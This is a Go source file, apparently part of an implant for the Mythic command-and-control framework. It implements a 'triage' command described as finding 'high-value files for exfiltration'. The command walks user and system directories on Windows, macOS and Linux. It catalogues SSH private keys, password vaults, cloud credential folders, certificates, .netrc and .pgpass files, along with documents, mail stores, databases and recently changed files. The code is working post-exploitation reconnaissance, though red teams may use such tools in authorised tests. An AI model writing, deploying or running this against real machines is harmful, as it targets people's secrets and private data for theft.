package commands

import (
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// TriageCommand scans for high-value files across common locations.
type TriageCommand struct{}

func (c *TriageCommand) Name() string        { return "triage" }
func (c *TriageCommand) Description() string { return "Find high-value files for exfiltration" }

// flexInt accepts both integer and string-encoded integer in JSON.
// Mythic UI sends numbers but manual JSON may send strings.
type flexInt int

func (f *flexInt) UnmarshalJSON(b []byte) error {
	var n int
	if err := json.Unmarshal(b, &n); err == nil {
		*f = flexInt(n)
		return nil
	}
	var s string
	if err := json.Unmarshal(b, &s); err == nil {
		n, err := strconv.Atoi(s)
		if err != nil {
			return fmt.Errorf("flexInt: cannot parse %q as int", s)
		}
		*f = flexInt(n)
		return nil
	}
	return fmt.Errorf("flexInt: expected int or string, got %s", string(b))
}

type triageArgs struct {
	Action   string  `json:"action"`
	MaxSize  int64   `json:"max_size"`
	MaxFiles int     `json:"max_files"`
	Path     string  `json:"path"`
	Hours    flexInt `json:"hours"` // for 'recent' action: time window in hours (default: 24)
}

type triageResult struct {
	Path     string `json:"path"`
	Size     int64  `json:"size"`
	ModTime  string `json:"modified"`
	Category string `json:"category"`
}

func (c *TriageCommand) Execute(task structs.Task) structs.CommandResult {
	var args triageArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Failed to parse arguments: %v", err)
	}

	if args.Action == "" {
		args.Action = "all"
	}
	if args.MaxSize == 0 {
		args.MaxSize = 10 * 1024 * 1024 // 10MB default
	}
	if args.MaxFiles == 0 {
		args.MaxFiles = 200
	}

	var results []triageResult

	switch args.Action {
	case "all":
		results = triageAll(task, args)
	case "documents":
		results = triageDocuments(task, args)
	case "credentials":
		results = triageCredentials(task, args)
	case "configs":
		results = triageConfigs(task, args)
	case "recent":
		results = triageRecent(task, args)
	case "database":
		results = triageDatabase(task, args)
	case "scripts":
		results = triageScripts(task, args)
	case "archives":
		results = triageArchives(task, args)
	case "mail":
		results = triageMail(task, args)
	case "custom":
		if args.Path == "" {
			return errorResult("Error: -path required for custom triage")
		}
		results = triageCustom(task, args)
	default:
		return errorf("Unknown action: %s. Use: all, documents, credentials, configs, database, scripts, archives, mail, recent, custom", args.Action)
	}

	if task.DidStop() {
		return successf("Triage cancelled. Found %d files before stop.", len(results))
	}

	if len(results) == 0 {
		return successResult("[]")
	}

	data, err := json.Marshal(results)
	if err != nil {
		return errorf("Error marshaling output: %v", err)
	}

	return successResult(string(data))
}

func triageAll(task structs.Task, args triageArgs) []triageResult {
	var results []triageResult
	results = append(results, triageDocuments(task, args)...)
	if task.DidStop() || len(results) >= args.MaxFiles {
		return results
	}
	results = append(results, triageCredentials(task, args)...)
	if task.DidStop() || len(results) >= args.MaxFiles {
		return results
	}
	results = append(results, triageConfigs(task, args)...)
	return results
}

func triageDocuments(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
		".odt", ".ods", ".odp", ".rtf", ".csv",
		".txt", ".md", ".log",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
			filepath.Join(home, "OneDrive"),
		}
	case "darwin":
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
		}
	default:
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
			home,
		}
	}

	return triageScan(task, searchPaths, extensions, "doc", args, 3)
}

func triageCredentials(task structs.Task, args triageArgs) []triageResult {
	// Credential file patterns
	patterns := []string{
		"*.kdbx", "*.kdb", "*.key", "*.pem", "*.pfx", "*.p12",
		"*.ppk", "*.rdp", "id_rsa", "id_ed25519", "id_ecdsa",
		"*.ovpn", "*.conf", ".netrc", ".pgpass",
		"credentials", "credentials.json", "credentials.xml",
		"web.config", "wp-config.php",
		"*.jks", "*.keystore",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			home,
			filepath.Join(home, ".ssh"),
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".gcloud"),
			filepath.Join(home, "AppData", "Roaming"),
			`C:\inetpub`,
			`C:\xampp`,
		}
	case "darwin":
		searchPaths = []string{
			filepath.Join(home, ".ssh"),
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".gcloud"),
			filepath.Join(home, ".gnupg"),
			filepath.Join(home, ".config"),
			"/etc",
		}
	default:
		searchPaths = []string{
			filepath.Join(home, ".ssh"),
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".gcloud"),
			filepath.Join(home, ".gnupg"),
			filepath.Join(home, ".config"),
			"/etc",
			"/opt",
			"/var/www",
		}
	}

	return triageScanPatterns(task, searchPaths, patterns, "cred", args, 3)
}

func triageConfigs(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".conf", ".cfg", ".ini", ".yaml", ".yml", ".json",
		".xml", ".properties", ".env", ".toml",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".kube"),
			`C:\ProgramData`,
		}
	default:
		searchPaths = []string{
			"/etc",
			filepath.Join(home, ".config"),
			filepath.Join(home, ".kube"),
			filepath.Join(home, ".docker"),
		}
	}

	return triageScan(task, searchPaths, extensions, "config", args, 2)
}

// triageRecent finds files modified within a time window across common directories.
// Useful for understanding current system activity — what's been touched recently.
func triageRecent(task structs.Task, args triageArgs) []triageResult {
	hours := int(args.Hours)
	if hours <= 0 {
		hours = 24 // default: last 24 hours
	}
	cutoff := time.Now().Add(-time.Duration(hours) * time.Hour)

	// Directories to skip (noise)
	skipDirs := map[string]bool{
		".cache": true, ".local": true, "node_modules": true,
		"__pycache__": true, ".git": true, ".npm": true,
		".cargo": true, ".rustup": true, "vendor": true,
		"Cache": true, "CachedData": true, "GPUCache": true,
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Downloads"),
			filepath.Join(home, "AppData", "Roaming"),
			os.TempDir(),
		}
	case "darwin":
		searchPaths = []string{
			home,
			"/tmp",
			"/var/log",
		}
	default:
		searchPaths = []string{
			home,
			"/tmp",
			"/var/log",
			"/opt",
		}
	}

	var results []triageResult
	for _, basePath := range searchPaths {
		if task.DidStop() || len(results) >= args.MaxFiles {
			break
		}
		baseDepth := strings.Count(basePath, string(os.PathSeparator))
		_ = filepath.WalkDir(basePath, func(path string, d fs.DirEntry, err error) error {
			if task.DidStop() || len(results) >= args.MaxFiles {
				return fmt.Errorf("limit")
			}
			if err != nil {
				return nil
			}
			if d.IsDir() {
				depth := strings.Count(path, string(os.PathSeparator)) - baseDepth
				if depth > 4 {
					return filepath.SkipDir
				}
				if skipDirs[d.Name()] {
					return filepath.SkipDir
				}
				return nil
			}
			info, infoErr := d.Info()
			if infoErr != nil {
				return nil
			}
			if info.Size() > args.MaxSize || info.Size() == 0 {
				return nil
			}
			if info.ModTime().Before(cutoff) {
				return nil
			}
			results = append(results, triageResult{
				Path:     path,
				Size:     info.Size(),
				ModTime:  info.ModTime().Format("2006-01-02 15:04"),
				Category: triageCategorizeFile(filepath.Base(path)),
			})
			return nil
		})
	}

	// Sort by modification time (newest first)
	sort.Slice(results, func(i, j int) bool {
		return results[i].ModTime > results[j].ModTime
	})

	return results
}

// triageCategorizeFile determines a file's category based on its name/extension.
func triageCategorizeFile(name string) string {
	ext := strings.ToLower(filepath.Ext(name))
	lower := strings.ToLower(name)

	// Credential patterns
	credPatterns := []string{"id_rsa", "id_ed25519", "id_ecdsa", ".pem", ".pfx", ".p12", ".key", ".kdbx", ".rdp", ".ovpn", "credentials", ".netrc", ".pgpass"}
	for _, p := range credPatterns {
		if strings.Contains(lower, p) {
			return "cred"
		}
	}

	// Document extensions
	docExts := map[string]bool{".doc": true, ".docx": true, ".xls": true, ".xlsx": true, ".ppt": true, ".pptx": true, ".pdf": true, ".odt": true, ".csv": true, ".rtf": true}
	if docExts[ext] {
		return "doc"
	}

	// Config extensions
	cfgExts := map[string]bool{".conf": true, ".cfg": true, ".ini": true, ".yaml": true, ".yml": true, ".json": true, ".xml": true, ".env": true, ".toml": true, ".properties": true}
	if cfgExts[ext] {
		return "config"
	}

	// Script/code
	codeExts := map[string]bool{".py": true, ".sh": true, ".ps1": true, ".bat": true, ".rb": true, ".pl": true, ".js": true, ".go": true}
	if codeExts[ext] {
		return "script"
	}

	// Log files
	if ext == ".log" || strings.Contains(lower, "log") {
		return "log"
	}

	// Database files
	dbExts := map[string]bool{".db": true, ".sqlite": true, ".sqlite3": true, ".mdb": true}
	if dbExts[ext] {
		return "database"
	}

	// Mail files
	mailExts := map[string]bool{".pst": true, ".ost": true, ".eml": true, ".msg": true, ".mbox": true, ".emlx": true, ".dbx": true, ".nsf": true}
	if mailExts[ext] {
		return "mail"
	}

	return "other"
}

func triageDatabase(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".db", ".sqlite", ".sqlite3", ".mdb", ".accdb",
		".ldf", ".mdf", ".sdf", ".bak",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			home,
			filepath.Join(home, "Documents"),
			filepath.Join(home, "AppData"),
			`C:\inetpub`,
			`C:\ProgramData`,
		}
	default:
		searchPaths = []string{
			home,
			"/var/lib",
			"/opt",
			"/var/www",
			"/srv",
			"/tmp",
		}
	}

	return triageScan(task, searchPaths, extensions, "database", args, 4)
}

func triageScripts(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".py", ".sh", ".bash", ".ps1", ".psm1", ".psd1",
		".bat", ".cmd", ".vbs", ".js", ".rb", ".pl",
		".php", ".lua", ".go", ".rs",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
			`C:\Scripts`,
			`C:\Tools`,
		}
	default:
		searchPaths = []string{
			home,
			"/opt",
			"/usr/local/bin",
			"/var/www",
			"/srv",
		}
	}

	return triageScan(task, searchPaths, extensions, "script", args, 3)
}

func triageArchives(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".zip", ".7z", ".rar", ".tar", ".gz", ".tgz",
		".bz2", ".xz", ".cab", ".iso", ".dmg",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
			`C:\Backups`,
			`C:\Temp`,
		}
	default:
		searchPaths = []string{
			home,
			"/tmp",
			"/var/backups",
			"/opt",
		}
	}

	return triageScan(task, searchPaths, extensions, "archive", args, 3)
}

func triageMail(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".pst", ".ost", ".eml", ".msg", ".mbox",
		".emlx", ".dbx", ".nsf",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Documents", "Outlook Files"),
			filepath.Join(home, "AppData", "Local", "Microsoft", "Outlook"),
			filepath.Join(home, "AppData", "Roaming", "Thunderbird", "Profiles"),
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
		}
	case "darwin":
		searchPaths = []string{
			filepath.Join(home, "Library", "Mail"),
			filepath.Join(home, "Library", "Thunderbird", "Profiles"),
			filepath.Join(home, "Documents"),
		}
	default:
		searchPaths = []string{
			home,
			filepath.Join(home, ".thunderbird"),
			filepath.Join(home, ".local", "share", "evolution", "mail"),
			"/var/mail",
			"/var/spool/mail",
		}
	}

	return triageScan(task, searchPaths, extensions, "mail", args, 3)
}

func triageCustom(task structs.Task, args triageArgs) []triageResult {
	// Scan all files under the custom path
	var results []triageResult
	_ = filepath.WalkDir(args.Path, func(path string, d fs.DirEntry, err error) error {
		if task.DidStop() || len(results) >= args.MaxFiles {
			return fmt.Errorf("limit")
		}
		if err != nil || d.IsDir() {
			return nil
		}
		info, infoErr := d.Info()
		if infoErr != nil {
			return nil
		}
		if info.Size() > args.MaxSize || info.Size() == 0 {
			return nil
		}
		results = append(results, triageResult{
			Path:     path,
			Size:     info.Size(),
			ModTime:  info.ModTime().Format("2006-01-02 15:04"),
			Category: "custom",
		})
		return nil
	})
	return results
}

// triageScan scans paths for files matching extensions.
func triageScan(task structs.Task, paths []string, extensions []string, category string, args triageArgs, maxDepth int) []triageResult {
	extMap := make(map[string]bool)
	for _, ext := range extensions {
		extMap[strings.ToLower(ext)] = true
	}

	var results []triageResult
	for _, basePath := range paths {
		if task.DidStop() || len(results) >= args.MaxFiles {
			break
		}
		baseDepth := strings.Count(basePath, string(os.PathSeparator))
		_ = filepath.WalkDir(basePath, func(path string, d fs.DirEntry, err error) error {
			if task.DidStop() || len(results) >= args.MaxFiles {
				return fmt.Errorf("limit")
			}
			if err != nil {
				return nil
			}
			depth := strings.Count(path, string(os.PathSeparator)) - baseDepth
			if depth > maxDepth && d.IsDir() {
				return filepath.SkipDir
			}
			if d.IsDir() {
				return nil
			}
			info, infoErr := d.Info()
			if infoErr != nil {
				return nil
			}
			if info.Size() > args.MaxSize || info.Size() == 0 {
				return nil
			}
			ext := strings.ToLower(filepath.Ext(filepath.Base(path)))
			if extMap[ext] {
				results = append(results, triageResult{
					Path:     path,
					Size:     info.Size(),
					ModTime:  info.ModTime().Format("2006-01-02 15:04"),
					Category: category,
				})
			}
			return nil
		})
	}
	return results
}

// triageScanPatterns scans paths for files matching glob patterns.
func triageScanPatterns(task structs.Task, paths []string, patterns []string, category string, args triageArgs, maxDepth int) []triageResult {
	var results []triageResult
	for _, basePath := range paths {
		if task.DidStop() || len(results) >= args.MaxFiles {
			break
		}
		baseDepth := strings.Count(basePath, string(os.PathSeparator))
		_ = filepath.WalkDir(basePath, func(path string, d fs.DirEntry, err error) error {
			if task.DidStop() || len(results) >= args.MaxFiles {
				return fmt.Errorf("limit")
			}
			if err != nil {
				return nil
			}
			depth := strings.Count(path, string(os.PathSeparator)) - baseDepth
			if depth > maxDepth && d.IsDir() {
				return filepath.SkipDir
			}
			if d.IsDir() {
				return nil
			}
			info, infoErr := d.Info()
			if infoErr != nil {
				return nil
			}
			if info.Size() > args.MaxSize || info.Size() == 0 {
				return nil
			}
			name := filepath.Base(path)
			for _, pattern := range patterns {
				if matched, _ := filepath.Match(pattern, name); matched {
					results = append(results, triageResult{
						Path:     path,
						Size:     info.Size(),
						ModTime:  info.ModTime().Format("2006-01-02 15:04"),
						Category: category,
					})
					break
				}
			}
			return nil
		})
	}
	return results
}
